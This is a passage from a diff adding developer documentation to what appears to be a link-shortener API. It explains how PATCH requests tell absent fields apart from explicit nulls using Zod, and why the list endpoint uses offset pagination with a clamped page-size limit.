+link never expires" / "unlimited clicks"), not the absence of one. A
+client that wants to *remove* an expiration needs a way to say "set
+`expiresAt` to null" that's distinguishable from "I didn't mention
+`expiresAt`, don't touch it." Collapsing those two into one case (e.g. if
+the update handler treated any falsy/undefined `expiresAt` as "clear it")
+would make it impossible to send a partial update that touches
+`destinationUrl` alone without accidentally wiping `expiresAt` too.
+
+**How it works mechanically.** The mechanism has two layers, and the
+important part is *where* the absent-vs-null information actually lives
+after Zod parsing. Verified directly against this project's installed
+Zod (3.x):
+
+```js
+z.object({ expiresAt: z.string().nullable().optional() }).safeParse({}).data
+// → {}                          ('expiresAt' in data → false)
+z.object({ expiresAt: z.string().nullable().optional() }).safeParse({ expiresAt: null }).data
+// → { expiresAt: null }         ('expiresAt' in data → true, value null)
+```
+
+Zod does **not** backfill an absent optional key onto its parsed output
+— so `'expiresAt' in parsedBody` is a reliable way to ask "did the
+client mention this field at all," entirely from the *parsed* Zod
+output, with no need to separately inspect the raw, pre-validation
+`req.body`. The route handler in `src/routes/links.ts` uses exactly that
+check to build a service-layer input object with only the keys the
+client actually sent:
+
+```ts
+const body = req.validated?.body as Record<string, unknown>;
+const parsed = updateLinkSchema.parse(body);
+
+const input: UpdateLinkInput = {};
+if (parsed.destinationUrl !== undefined) input.destinationUrl = parsed.destinationUrl;
+if ('expiresAt' in body) input.expiresAt = parsed.expiresAt ?? null;
+if ('maxClicks' in body) input.maxClicks = parsed.maxClicks ?? null;
+if (parsed.isActive !== undefined) input.isActive = parsed.isActive;
+```
+
+`destinationUrl` and `isActive` use the simpler `parsed.field !==
+undefined` check instead of `'field' in body` — they're `.optional()`
+only, with no `.nullable()`, so for those two fields being `undefined`
+in the parsed output and being absent from the raw body are the exact
+same condition; only `expiresAt`/`maxClicks` need the raw-body check
+because they're the ones that also accept an explicit `null`.
+`linkService.updateLink` then only writes a `SET` clause for a column
+when its corresponding `UpdateLinkInput` key is `!== undefined` — an
+input object with zero keys set skips the `UPDATE` statement entirely
+and just returns the current row, since an empty PATCH is a valid no-op,
+not an error.
+
+**Where it lives in the codebase.** Schema:
+`src/routes/links.ts`, `updateLinkSchema` (`.nullable().optional()` on
+`expiresAt`/`maxClicks`, plain `.optional()` on `destinationUrl`/`isActive`,
+and `.strict()` at the top level to reject unknown keys like
+`customAlias`, which is immutable after creation). Presence-to-input
+translation: the route handler shown above. Conditional `SET`-clause
+construction: `src/services/linkService.ts`, `updateLink`.
+
+**Common pitfalls.**
+
+- Using `??` (nullish coalescing) directly on `req.body.field` without
+  first checking presence — `undefined ?? someDefault` and `null ??
+  someDefault` both evaluate the same way, silently erasing the
+  distinction this whole mechanism exists to preserve.
+- Assuming Zod backfills absent optional keys as `undefined` *properties*
+  on the output object — it doesn't (per the verified REPL output
+  above); the key is simply missing, which is exactly what makes the
+  `'key' in parsedBody` check meaningful rather than redundant.
+- Forgetting that TypeScript's control-flow narrowing on `'key' in body`
+  doesn't transfer to a *different* object (`parsed`) typed independently
+  — `exactOptionalPropertyTypes` will correctly flag `input.field =
+  parsed.field` as potentially assigning `undefined` even inside an `if
+  ('field' in body)` block, because TS has no way to know the two objects'
+  presence conditions are linked; this project resolves it by checking
+  `parsed.field !== undefined` directly wherever that's equivalent (see
+  above), rather than suppressing the type error.
+
+**Production considerations.** This pattern (nullable-and-optional field,
+presence read off the parsed object, conditional SQL `SET` clause) is the
+reusable template for every future nullable field this API adds — no new
+mechanism needed, just the same three lines repeated per field.
+
+**Interview answer.** PATCH needs to distinguish three states per field:
+untouched, set to a value, and explicitly cleared — PUT only has two,
+because it assumes every field is always present. I encode that with
+Zod's `.nullable().optional()` and read presence directly off the
+*parsed* output using `'field' in body`, which I verified doesn't get
+backfilled for absent optional keys — so `safeParse({})` genuinely omits
+the key, while `safeParse({ field: null })` includes it with a `null`
+value. That distinction flows into a service function that only writes a
+SQL `SET` clause for fields actually present in its input object, so an
+absent field truly means "don't touch this column" all the way down to
+the query.
+
+---
+
+### Pagination: offset vs. cursor, and unbounded limits as a DoS vector
+
+**What it is.** Offset pagination (`LIMIT`/`OFFSET`) asks the database
+for "skip N rows, then give me the next M" — simple, and it supports
+jumping directly to an arbitrary page. Cursor pagination instead asks
+for "give me M rows after this specific row" (typically encoding the
+last-seen row's sort key as an opaque token) — it doesn't support
+jumping to an arbitrary page number, but it doesn't degrade as the
+offset grows the way `OFFSET` does, and it stays correct even if rows
+are inserted or deleted between page requests.
+
+**Why it exists in this project.** `GET /api/links` needed *some*
+pagination scheme — returning every link a user has ever created in one
+response doesn't scale and is exactly the kind of unbounded-response
+risk covered below. This phase chose offset pagination deliberately, not
+by default: the links table's only index today is on `user_id` alone
+(`migrations/20260810111606896_create-links-table.ts`), and that
+migration's own comment explicitly defers all query-driven indexing
+decisions — including whatever composite index cursor pagination would
+need, like `(user_id, created_at, id)` — to a dedicated later indexing
+phase. Building that index now, just to support cursor pagination ahead
+of when it's needed, would be optimizing a phase that isn't this one's
+to own.
+
+**How it works mechanically.** `listLinks` runs two independent,
+parallel queries — one for the page of rows, one for the total count —
+rather than a single query with a window function, matching this
+codebase's existing preference for the simplest correct SQL over a more
+clever alternative:
+
+```ts
+const [rowsResult, countResult] = await Promise.all([
+  query<LinkRow>(
+    `SELECT ${LINK_COLUMNS} FROM links WHERE user_id = $1
+     ORDER BY created_at DESC, id DESC LIMIT $2 OFFSET $3`,
+    [userId, options.limit, options.offset],
+  ),
+  query<{ count: number }>('SELECT count(*)::int AS count FROM links WHERE user_id = $1', [userId]),
+]);
+```
+
+`ORDER BY created_at DESC, id DESC` includes `id` as an explicit
+tiebreaker deliberately — `created_at` isn't guaranteed unique (two links
+created in the same millisecond are entirely possible), and without a
+unique tiebreaker, rows with identical timestamps could be ordered
+differently between two page requests, corrupting pagination results in
+a way that's hard to notice and harder to reproduce.
+
+The `limit` query parameter itself is validated as a positive integer,
+but a value **above** `MAX_PAGE_SIZE` (100) is deliberately *clamped*,
+not rejected with 400:
+
+```ts
+const { limit: requestedLimit, offset } = listLinksQuerySchema.parse(req.validated?.query);
+const limit = Math.min(requestedLimit, MAX_PAGE_SIZE);
+```
+
+The response's `pagination.limit` always reflects this effective,
+clamped value — not whatever the client originally asked for — so a
+caller who requested more than the maximum can tell what they actually
+got back. This is a deliberate choice over strict rejection: `limit` is
+a hint about how much the client wants, not a semantic assertion about
+the request's validity the way a malformed UUID is (which genuinely
+*can't* be satisfied, making 400 correct there). An oversized `limit` is
+trivially and safely satisfiable by capping it, and well-regarded APIs
+(GitHub, Stripe) clamp for exactly this reason — turning an innocent,
+slightly-too-eager `?limit=200` into a hard client-facing failure serves
+no one, when silently returning a capped, correctly-labeled page does
+the same job better.
+
+**Where it lives in the codebase.** `src/services/linkService.ts`,
+`listLinks`. `src/routes/links.ts`, `listLinksQuerySchema` and the
+clamping logic in the `GET /` handler. `MAX_PAGE_SIZE`/`DEFAULT_PAGE_SIZE`
+constants live alongside the schema.
+
+**Common pitfalls.**
+
+- Sorting only by `created_at` without a tiebreaker — works in casual
+  testing (timestamps rarely collide when you're creating rows one at a
+  time by hand) and silently misbehaves under real concurrent write load.
+- Rejecting an oversized `limit` with 400 instead of clamping it —
+  defensible, but turns a harmless request into a hard failure for no
+  correctness reason; if this project ever changes that decision, it
+  should be a deliberate one, documented here, not an accident of "that's
+  just what `.max()` does."
+- Confusing "malformed" with "oversized": a non-numeric, negative, or
+  zero `limit` genuinely cannot be satisfied and correctly stays a 400;
+  only the *upper* bound is clamped rather than rejected.
+
+**Production considerations — what would change this decision.** Offset
+pagination's known weakness is that `OFFSET` doesn't skip rows for free —
+Postgres still has to scan and discard every skipped row before it can
+return the requested page, so deep pages get progressively more
+expensive as `offset` grows. That's not a real cost yet at a single
+user's realistic link count, but it would become one at very high
+per-user link volumes or once deep-page access became a common, not
+edge-case, usage pattern — at that point, the fix is cursor pagination
+over a purpose-built `(user_id, created_at, id)` index, which the schema
+comment already flags as a Phase 12 decision, not a Phase 6 one.
+
+**Interview answer.** I used offset pagination, not cursor, because
+cursor pagination needs a composite index this table doesn't have yet —
+the links migration explicitly defers all query-driven indexing to a
+later phase, and building that index early would be solving a problem
+ahead of the phase that owns it. Offset works correctly today off the
+existing `user_id` index; it would stop being the right choice once deep
+pages or very high per-user link counts made `OFFSET`'s "scan and discard
+every skipped row" cost actually matter. Separately, I clamp an
+oversized `limit` rather than rejecting it with 400 — unlike a malformed
+UUID, a too-large limit is a request that's trivially satisfiable by
+capping it, and I echo the effective limit back in the response so the
+caller can tell. An unbounded limit, left unclamped, is a real
+denial-of-service vector on its own — a single request for an enormous
+page forces the server to materialize and serialize an arbitrarily large
+result set, real memory/CPU/bandwidth cost that a `MAX_PAGE_SIZE` closes
+regardless of whether it's enforced by rejection or by clamping.
